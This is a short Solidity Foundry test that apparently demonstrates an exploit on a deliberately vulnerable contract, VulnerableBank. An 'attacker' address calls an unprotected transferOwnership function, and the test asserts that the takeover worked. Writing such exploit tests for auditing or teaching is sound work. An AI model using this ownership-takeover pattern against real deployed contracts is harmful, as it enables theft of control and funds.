// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract VulnerableBankTest is BaseTestWithBalanceLog {
    VulnerableBank target;

    function setUp() public override {
        target = VulnerableBank(new VulnerableBank());
    }

    function testExploit() public {
        address attacker = address(0);
        vm.startPrank(attacker);

        target.transferOwnership(attacker);

        assertEq(target.owner(), attacker, "Owner should be the attacker");
    }
}